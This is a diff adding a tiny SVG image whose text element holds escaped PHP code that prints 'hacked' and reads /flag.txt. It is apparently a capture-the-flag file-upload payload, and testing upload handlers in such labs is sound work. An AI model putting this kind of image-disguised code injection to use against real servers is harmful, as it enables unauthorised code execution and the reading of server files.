@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="17px" height="17px">
+    <text>&lt;?php echo "hacked";echo file_get_contents("/flag.txt"); ?&gt;</text>
+</svg>
+
